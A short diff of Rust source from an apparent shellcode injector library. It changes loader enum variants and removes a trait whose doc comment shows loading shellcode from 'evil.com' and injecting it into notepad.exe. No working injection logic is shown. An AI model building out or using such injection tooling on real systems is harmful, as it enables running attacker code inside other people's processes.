@@ -41,13 +41,6 @@ use sysinfo::{ProcessExt, System, SystemExt, PidExt};
 use reqwest::blocking::get;
 use base64::{Engine as _, engine::general_purpose};
 
-// ================
-// Internal Modules
-// ================
-pub mod embedded;
-pub mod b64embedded;
-
-
 ///
 /// The possible types of shellcode loaders. They are:
 /// 
@@ -61,9 +54,9 @@ pub mod b64embedded;
 /// 
 pub enum InjectorType {
     Url(String),
-    Base64Url(String),
+    Base64Url((String, usize)),
     Embedded(Vec<u8>),
-    Base64Embedded(String)
+    Base64Embedded((String, usize))
 }
 
 ///
@@ -73,37 +66,6 @@ pub enum InjectorType {
 pub enum InjectionType {
     Reflect,
     Remote(String)
-}
-
-///
-/// The `Injector` Trait comprises two functions: `inject()`, 
-/// which performs the specified injection, and `load()`, 
-/// which configures the Injector to load the shellcode from
-/// a given source.
-/// 
-/// `Injector`s follow a builder pattern, meaning their 
-/// implementation might be something like:
-/// 
-/// ```
-/// UrlInjector::new()
-///     .load(Url("https://evil.com/shellcode.bin"))?;
-///     .wait(true)?
-///     .inject(InjectionType::Remote("notepad.exe".to_string()))?
-/// 
-/// ```
-/// 
-/// This allows for more injector types with additional 
-/// options to easily be built in the future.
-/// 
-pub trait Injector {
-    fn load(self, sc_source: InjectorType) -> Result<Self, String> where 
-        Self: Sized;
-
-    fn wait(self, wait: bool) -> Result<Self, String>  where 
-        Self: Sized;
-    
-    fn inject(&self, injection_type: InjectionType) -> Result<(), String>;
-    
 }
 
 ///
